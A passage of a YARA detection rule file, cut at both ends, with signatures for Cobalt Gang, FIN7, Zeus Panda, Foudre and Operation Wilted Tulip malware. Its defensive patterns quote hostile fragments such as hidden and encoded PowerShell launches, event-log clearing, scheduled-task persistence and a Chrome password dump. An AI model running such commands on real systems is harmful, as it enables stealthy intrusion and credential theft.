0x5a4d and filesize < 400KB and 3 of them )\n}\n\nrule CobaltGang_Malware_Aug17_2_RID3080 : DEMO EXE FILE G0080 MAL {\n   meta:\n      description = \"Detects a Cobalt Gang malware\"\n      author = \"Florian Roth\"\n      reference = \"https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c\"\n      date = \"2017-08-09 12:42:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"80791d5e76782cc3cd14f37f351e33b860818784192ab5b650f1cdf4f131cf72\"\n      tags = \"DEMO, EXE, FILE, G0080, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; BOIE9;ENGB)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}\n\nrule Agent_BTZ_Proxy_DLL_1_RID2E9B : DEMO EXE FILE MAL T1090 {\n   meta:\n      description = \"Detects Agent-BTZ Proxy DLL - activeds.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/\"\n      date = \"2017-08-07 11:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c163c3f2bd5c5181147c6f4cf2571160197de98f496d16b38c7dc46b5dc1426\"\n      hash2 = \"628d316a983383ed716e3f827720915683a8876b54677878a7d2db376d117a24\"\n      tags = \"DEMO, EXE, FILE, MAL, T1090\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Modules\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them and pe.exports ( \"Entry\" ) )\n}\n\nrule Agent_BTZ_Aug17_RID2C33 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Agent.BTZ\"\n      author = \"Florian Roth\"\n      reference = \"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/\"\n      date = \"2017-08-07 09:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6ad78f069c3619d0d18eef8281219679f538cfe0c1b6d40b244beb359762cf96\"\n      hash2 = \"49c5c798689d4a54e5b7099b647b0596fb96b996a437bb8241b5dd76e974c24e\"\n      hash3 = \"e88970fa4892150441c1616028982fe63c875f149cd490c3c910a1c091d3ad49\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"stdole2.tlb\" fullword ascii\n      $s2 = \"UnInstallW\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them and pe.exports ( \"Entry\" ) and pe.exports ( \"InstallW\" ) and pe.exports ( \"UnInstallW\" ) )\n}\n\nrule MAL_Zeus_Panda_Aug17_RID2E18 : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ZEUS Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://cyberwtf.files.wordpress.com/2017/07/panda-whitepaper.pdf\"\n      date = \"2017-08-04 10:59:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-05-12\"\n      hash1 = \"bd956b2e81731874995b9b92e20f75dbf67ac5f12f9daa194525e1b673c7f83c\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SER32.dll\" fullword ascii\n      $x2 = \"/c start \\\"\\\" \\\"%s\\\"\" fullword wide\n      $x3 = \"del /F \\\"%s\\\"\" fullword ascii\n      $s1 = \"bcdfghklmnpqrstvwxz\" fullword ascii\n      $s2 = \"=> -,0;\" fullword ascii\n      $s3 = \"Yahoo! Slurp\" fullword ascii\n      $s4 = \"ZTNHGET ^&\" fullword ascii\n      $s5 = \"MSIE 9\" fullword ascii\n      $s6 = \"%s%08x.%s\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 2 of ( $x* ) or 4 of them )\n}\n\nrule FIN7_Dropper_Aug17_RID2D44 : DEMO FILE G0046 MAL OFFICE RUSSIA {\n   meta:\n      description = \"Detects Word Dropper from Proofpoint FIN7 Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor\"\n      date = \"2017-08-04 10:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c91642c0a5a8781fff9fd400bff85b6715c96d8e17e2d2390c1771c683c7ead9\"\n      hash2 = \"cf86c7a92451dca1ebb76ebd3e469f3fa0d9b376487ee6d07ae57ab1b65a86f8\"\n      tags = \"DEMO, FILE, G0046, MAL, OFFICE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"tpircsj:e/ b// exe.tpircsw\\\" rt/\" fullword ascii\n      $s1 = \"Scripting.FileSystemObject$\" fullword ascii\n      $s2 = \"PROJECT.THISDOCUMENT.AUTOOPEN\" fullword wide\n      $s3 = \"Project.ThisDocument.AutoOpen\" fullword wide\n      $s4 = \"\\\\system3\" ascii\n      $s5 = \"ShellV\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 700KB and 1 of ( $x* ) or all of ( $s* ) )\n}\n\nrule FIN7_Backdoor_Aug17_RID2D8D : DEMO EXE G0046 MAL OFFICE RUSSIA T1053_005 {\n   meta:\n      description = \"Detects Word Dropper from Proofpoint FIN7 Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor\"\n      date = \"2017-08-04 10:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, G0046, MAL, OFFICE, RUSSIA, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"wscript.exe //b /e:jscript C:\\\\Users\\\\\" ascii\n      $x2 = \"wscript.exe /b /e:jscript C:\\\\Users\\\\\" ascii\n      $x3 = \"schtasks /Create /f /tn \\\"GoogleUpdateTaskMachineSystem\\\" /tr \\\"wscript.exe\" ascii nocase\n      $x4 = \"schtasks /Delete /F /TN \\\"\\\"GoogleUpdateTaskMachineCore\" ascii nocase\n      $x5 = \"schtasks /Delete /F /TN \\\"GoogleUpdateTaskMachineCore\" ascii nocase\n      $x6 = \"wscript.exe //b /e:jscript %TMP%\\\\debug.txt\" ascii\n      $s1 = \"/?page=wait\" fullword ascii\n      $a1 = \"autoit3.exe\" fullword ascii\n      $a2 = \"dumpcap.exe\" fullword ascii\n      $a3 = \"tshark.exe\" fullword ascii\n      $a4 = \"prl_cc.exe\" fullword ascii\n      $v1 = \"vmware\" fullword ascii\n      $v2 = \"PCI\\\\\\\\VEN_80EE&DEV_CAFE\" fullword ascii\n      $v3 = \"VMWVMCIHOSTDEV\" fullword ascii\n      $c1 = \"apowershell\" fullword ascii\n      $c2 = \"wpowershell\" fullword ascii\n      $c3 = \"get_passwords\" fullword ascii\n      $c4 = \"kill_process\" fullword ascii\n      $c5 = \"get_screen\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( 1 of ( $x* ) or all of ( $a* ) or all of ( $v* ) or 3 of ( $c* ) ) ) or 5 of them\n}\n\nrule IsmDoor_Jul17_A2_RID2C92 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects IsmDoor Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/Voulnet/status/892104753295110145\"\n      date = \"2017-08-01 09:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"be72c89efef5e59c4f815d2fce0da5a6fac8c90b86ee0e424868d4ae5e550a59\"\n      hash2 = \"ea1be14eb474c9f70e498c764aaafc8b34173c80cac9a8b89156e9390bd87ba8\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell -exec bypass -file \\\"\" fullword ascii\n      $s2 = \"PAQlFcaWUaFkVICEx2CkNCUUpGcA\" ascii\n      $s3 = \"\\\\Documents\" ascii\n      $s4 = \"\\\\Libraries\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )\n}\n\nrule Unknown_Malware_Sample_Jul17_2_RID326D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects unknown malware sample with pastebin RAW URL\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/gui/file/3530d480db082af1823a7eb236203aca24dc3685f08c301466909f0794508a52/detection\"\n      date = \"2017-08-01 14:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"3530d480db082af1823a7eb236203aca24dc3685f08c301466909f0794508a52\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"4System.Web.Services.Protocols.SoapHttpClientProtocol\" fullword ascii\n      $s2 = \"https://pastebin.com/raw/\" wide\n      $s3 = \"My.Computer\" fullword ascii\n      $s4 = \"MyTemplate\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule Foudre_Backdoor_1_RID2D8A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Foudre Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/08/unit42-prince-persia-ride-lightning-infy-returns-foudre/\"\n      date = \"2017-08-01 10:36:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"7e73a727dc8f3c48e58468c3fd0a193a027d085f25fa274a6e187cf503f01f74\"\n      hash2 = \"7ce2c5111e3560aa6036f98b48ceafe83aa1ac3d3b33392835316c859970f8bc\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"initialization failed: Reinstall the program\" fullword wide\n      $s2 = \"SnailDriver V1\" fullword wide\n      $s3 = \"lp.ini\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them )\n}\n\nrule Foudre_Backdoor_Dropper_1_RID30C5 : DEMO EXE FILE MAL T1547_001 {\n   meta:\n      description = \"Detects Foudre Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/08/unit42-prince-persia-ride-lightning-infy-returns-foudre/\"\n      date = \"2017-08-01 12:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"6bc9f6ac2f6688ed63baa29913eaf8c64738cf19933d974d25a0c26b7d01b9ac\"\n      hash2 = \"da228831089c56743d1fbc8ef156c672017cdf46a322d847a270b9907def53a5\"\n      tags = \"DEMO, EXE, FILE, MAL, T1547_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"536F594A96C5496CB3949A4DA4775B576E049C57696E646F77735C43757272656E7456657273696F6E5C5C52756E\" fullword wide\n      $x2 = \"2220263024C380B3278695851482EC32\" fullword wide\n      $s1 = \"C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\\\\\Startup\\\\\" wide\n      $s2 = \"C:\\\\Documents and Settings\\\\All Users\\\\\" wide\n      $s3 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\\\\\Shell Folders\" wide\n      $s4 = \"ShellExecuteW\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them ) )\n}\n\nrule Foudre_Backdoor_Component_1_RID319C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Foudre Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/08/unit42-prince-persia-ride-lightning-infy-returns-foudre/\"\n      date = \"2017-08-01 13:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"7c6206eaf0c5c9c6c8d8586a626b49575942572c51458575e51cba72ba2096a4\"\n      hash2 = \"db605d501d3a5ca2b0e3d8296d552fbbf048ee831be21efca407c45bf794b109\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = { 50 72 6F 6A 65 63 74 31 2E 64 6C 6C 00 44 31 } \n      $s2 = \"winmgmts:\\\\\\\\localhost\\\\root\\\\SecurityCenter2\" fullword wide\n      $s3 = \"C:\\\\Documents and Settings\\\\All Users\\\\\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 3 of them ) or ( 2 of them and pe.exports ( \"D1\" ) ) )\n}\n\nrule Foudre_Backdoor_SFX_RID2E4A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Foudre Backdoor SFX\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/08/unit42-prince-persia-ride-lightning-infy-returns-foudre/\"\n      date = \"2017-08-01 11:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"2b37ce9e31625d8b9e51b88418d4bf38ed28c77d98ca59a09daab01be36d405a\"\n      hash2 = \"4d51a0ea4ecc62456295873ff135e4d94d5899c4de749621bafcedbf4417c472\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"main.exe\" fullword ascii\n      $s2 = \"pub.key\" fullword ascii\n      $s3 = \"WinRAR self-extracting archive\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule CACTUSTORCH_RID2A54 : DEMO HKTL T1218_011 {\n   meta:\n      description = \"Detects CactusTorch Hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/mdsecactivebreach/CACTUSTORCH_RID2A54\"\n      date = \"2017-07-31 05:11:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"314e6d7d863878b6dca46af165e7f08fedd42c054d7dc3828dc80b86a3a9b98c\"\n      hash2 = \"0305aa32d5f8484ca115bb4888880729af7f33ac99594ec1aa3c65644e544aea\"\n      hash3 = \"a52d802e34ac9d7d3539019d284b04ded3b8e197d5e3b38ed61f523c3d68baa7\"\n      tags = \"DEMO, HKTL, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$payload = shellcode(%options[\\\"listener\\\"], \\\"true\\\", \\\"x86\\\");\" fullword ascii\n      $x2 = \"Copy the base64 encoded payload into the code variable below.\" fullword ascii\n      $x3 = \" CACTUSTORCH_RID2A54 Payload\" ascii\n      $x4 = \"ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)\" fullword ascii\n      $x5 = \"' Author: Vincent Yiu (@vysecurity)\" fullword ascii\n      $x6 = \"Dim binary : binary = \\\"rundll32.exe\\\"\" fullword ascii\n      $a1 = \"code = code & \\\"\" ascii\n      $a2 = \"serialized_obj = serialized_obj & \\\"\" ascii\n      $s1 = \"binary = \\\"rundll32.exe\\\"\" fullword ascii\n      $s2 = \"EL.DataType = \\\"bin.hex\\\"\" fullword ascii\n      $s3 = \"Set stm = CreateObject(\\\"System.IO.MemoryStream\\\")\" fullword ascii\n      $s4 = \"var binary = \\\"rundll32.exe\\\";\" fullword ascii\n      $s5 = \"var serialized_obj = \\\"\" ascii\n   condition: \n      ( filesize < 800KB and ( 1 of ( $x* ) or ( 1 of ( $a* ) and 1 of ( $s* ) ) ) ) or ( 3 of them )\n}\n\nrule SUSP_MyWScript_RID2C4D : DEMO EXE FILE MAL SUSP {\n   meta:\n      description = \"Detects files generated with Script2Exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-07-27 09:43:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"515f5188ba6d039b8c38f60d3d868fa9c9726e144f593066490c7c97bf5090c8\"\n      tags = \"DEMO, EXE, FILE, MAL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Projets\\\\vbsedit_source\\\\script2exe\\\\Release\\\\mywscript.pdb\" fullword ascii\n      $s1 = \"mywscript2\" fullword wide\n      $s2 = \"MYWSCRIPT2\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( $x1 or 2 of them )\n}\n\nrule AllTheThings_RID2BB8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects AllTheThings_RID2BB8\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/subTee/AllTheThings_RID2BB8\"\n      date = \"2017-07-27 09:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"5a0e9a9ce00d843ea95bd5333b6ab50cc5b1dbea648cc819cfe48482513ce842\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Debug\\\\AllTheThings_RID2BB8.pdb\" ascii\n      $x2 = \"AllTheThings_RID2BB8.exe\" fullword wide\n      $x3 = \"\\\\AllTheThings_RID2BB8.dll\" ascii\n      $x4 = \"Hello From Main...I Don't Do Anything\" fullword wide\n      $x5 = \"I am a basic COM Object\" fullword wide\n      $x6 = \"I shouldn't really execute either.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )\n}\n\nrule PowerShell_Emp_Eval_Jul17_A1_RID3141 : DEMO EXE FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects suspicious sample with PowerShell content \"\n      author = \"Florian Roth\"\n      reference = \"PowerShell Empire Eval\"\n      date = \"2017-07-27 13:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4d10e80c7c80ef040efc680424a429558c7d76a965685bbc295908cb71137eba\"\n      tags = \"DEMO, EXE, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell\" wide\n      $s2 = \"pshcmd\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )\n}\n\nrule PowerShell_Emp_Eval_Jul17_A2_RID3142 : DEMO EXE FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects suspicious sample with PowerShell content \"\n      author = \"Florian Roth\"\n      reference = \"PowerShell Empire Eval\"\n      date = \"2017-07-27 13:14:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e14c139159c23fdc18969afe57ec062e4d3c28dd42a20bed8ddde37ab4351a51\"\n      tags = \"DEMO, EXE, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\support\\\\Release\\\\ab.pdb\" ascii\n      $s2 = \"powershell.exe\" ascii fullword\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule WiltedTulip_Tools_back_RID2FE8 : APT DEMO EXE FILE T1003 {\n   meta:\n      description = \"Detects Chrome password dumper used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 12:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"b7faeaa6163e05ad33b310a8fdc696ccf1660c425fa2a962c3909eada5f2c265\"\n      tags = \"APT, DEMO, EXE, FILE, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s.exe -f \\\"C:\\\\Users\\\\Admin\\\\Google\\\\Chrome\\\\TestProfile\\\" -o \\\"c:\\\\passlist.txt\\\"\" fullword ascii\n      $x2 = \"\\\\ChromePasswordDump\\\\Release\\\\FireMaster.pdb\" ascii\n      $x3 = \"//Dump Chrome Passwords to a Output file \\\"c:\\\\passlist.txt\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}\n\nrule WiltedTulip_Tools_clrlg_RID306B : APT DEMO SCRIPT {\n   meta:\n      description = \"Detects Windows eventlog cleaner used in Operation Wilted Tulip - file clrlg.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 12:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b33fd3420bffa92cadbe90497b3036b5816f2157100bf1d9a3b6c946108148bf\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"('wevtutil.exe el') DO (call :do_clear\" fullword ascii\n      $s2 = \"wevtutil.exe cl %1\" fullword ascii\n   condition: \n      filesize < 1KB and 1 of them\n}\n\nrule WiltedTulip_powershell_RID302C : APT DEMO SCRIPT T1059_001 {\n   meta:\n      description = \"Detects powershell script used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 12:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e5ee1f45cbfdb54b02180e158c3c1f080d89bce6a7d1fe99dd0ff09d47a36787\"\n      tags = \"APT, DEMO, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+\" ascii\n   condition: \n      1 of them\n}\n\nrule WiltedTulip_vminst_RID2E88 : APT DEMO EXE FILE T1218_011 {\n   meta:\n      description = \"Detects malware used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 11:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"930118fdf1e6fbffff579e65e1810c8d91d4067cbbce798c5401cf05d7b4c911\"\n      tags = \"APT, DEMO, EXE, FILE, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\C++\\\\Trojan\\\\Target\\\\\" ascii\n      $s1 = \"%s\\\\system32\\\\rundll32.exe\" fullword wide\n      $s2 = \"$C:\\\\Windows\\\\temp\\\\l.tmp\" fullword wide\n      $s3 = \"%s\\\\svchost.exe\" fullword wide\n      $s4 = \"args[10] is %S and command is %S\" fullword ascii\n      $s5 = \"LOGON USER FAILD \" fullword ascii\n      $s6 = \"vminst.tmp\" fullword wide\n      $s7 = \"operator co_await\" fullword ascii\n      $s8 = \"?ReflectiveLoader@@YGKPAX@Z\" fullword ascii\n      $s9 = \"%s -k %s\" fullword wide\n      $s10 = \"ERROR in %S/%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 5 of ( $s* ) )\n}\n\nrule WiltedTulip_Windows_UM_Task_RID31C5 : APT DEMO T1053 T1053_005 T1218_011 {\n   meta:\n      description = \"Detects a Windows scheduled task as used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 13:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4c2fc21a4aab7686877ddd35d74a917f6156e48117920d45a3d2f21fb74fedd3\"\n      tags = \"APT, DEMO, T1053, T1053_005, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $r1 = \"<Command>C:\\\\Windows\\\\syswow64\\\\rundll32.exe</Command>\" fullword wide\n      $p1 = \"<Arguments>\\\"C:\\\\Users\\\\public\\\\\" wide\n      $c1 = \"svchost64.swp\\\",checkUpdate\" wide ascii\n      $c2 = \"svchost64.swp,checkUpdate\" wide ascii\n   condition: \n      ( $r1 and $p1 ) or 1 of ( $c* )\n}\n\nrule WiltedTulip_WindowsTask_RID3065 : APT DEMO {\n   meta:\n      description = \"Detects hack tool used in Operation Wilted Tulip - Windows Tasks\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 12:38:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c3cbe88b82cd0ea46868fb4f2e8ed226f3419fc6d4d6b5f7561e70f4cd33822c\"\n      hash2 = \"340cbbffbb7685133fc318fa20e4620ddf15e56c0e65d4cf1b2d606790d4425d\"\n      hash3 = \"b6f515b3f713b70b808fc6578232901ffdeadeb419c9c4219fbfba417bba9f01\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<Command>C:\\\\Windows\\\\svchost.exe</Command>\" fullword wide\n      $x2 = \"<Arguments>-nop -w hidden -encodedcommand\" wide\n      $x3 = \"-encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA\" \n   condition: \n      1 of them\n}\n\nrule WiltedTulip_tdtess_RID2E7E : APT DEMO EXE FILE T1569_002 {\n   meta:\n      description = \"Detects malicious service used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 11:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3fd28b9d1f26bd0cee16a167184c9f4a22fd829454fd89349f2962548f70dc34\"\n      tags = \"APT, DEMO, EXE, FILE, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"d2lubG9naW4k\" fullword wide\n      $x2 = \"C:\\\\Users\\\\admin\\\\Documents\\\\visual studio 2015\\\\Projects\\\\Export\\\\TDTESS_ShortOne\\\\WinService Template\\\\\" ascii\n      $s1 = \"\\\\WinService Template\\\\obj\\\\x64\\\\x64\\\\winlogin\" ascii\n      $s2 = \"winlogin.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of them ) )\n}\n\nrule WiltedTulip_SilverlightMSI_RID315D : APT DEMO SCRIPT T1059_001 {\n   meta:\n      description = \"Detects powershell tool call Get_AD_Users_Logon_History used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 13:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c75906dbc3078ff81092f6a799c31afc79b1dece29db696b2ecf27951a86a1b2\"\n      tags = \"APT, DEMO, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".\\\\Get_AD_Users_Logon_History.ps1 -MaxEvent\" fullword ascii\n      $x2 = \"if ((Resolve-dnsname $_.\\\"IP Address\\\" -Type PTR -TcpOnly -DnsOnly -ErrorAction \\\"SilentlyContinue\\\").Type -eq \\\"PTR\\\")\" fullword ascii\n      $x3 = \"$Client_Name = (Resolve-dnsname $_.\\\"IP Address\\\" -Type PTR -TcpOnly -DnsOnly).NameHost  \" fullword ascii\n      $x4 = \"########## Find the Computer account in AD and if not found, throw an exception ###########\" fullword ascii\n   condition: \n      ( filesize < 20KB and 1 of them )\n}\n\nrule WiltedTulip_matryoshka_Injector_RID33C7 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects hack tool used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 15:02:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = 